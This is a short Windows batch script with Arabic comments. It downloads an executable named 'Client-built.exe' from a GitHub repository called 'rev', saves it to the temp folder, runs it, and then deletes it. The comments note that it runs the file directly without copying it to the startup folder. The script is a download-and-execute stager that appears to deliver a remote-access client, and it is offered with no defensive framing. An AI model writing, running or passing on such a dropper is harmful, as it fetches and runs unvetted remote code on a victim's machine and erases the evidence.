@echo off
setlocal

set "url=https://github.com/tiraUnderCode/rev/raw/main/Client-built.exe"
set "tempFile=%temp%\Client-built.exe"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempFile%'"

:: تنفيذ الملف مباشرة دون نقله إلى مجلد البداية التلقائي
start "" "%tempFile%"

:: حذف الملف المؤقت بعد تنفيذه
del "%tempFile%"

endlocal
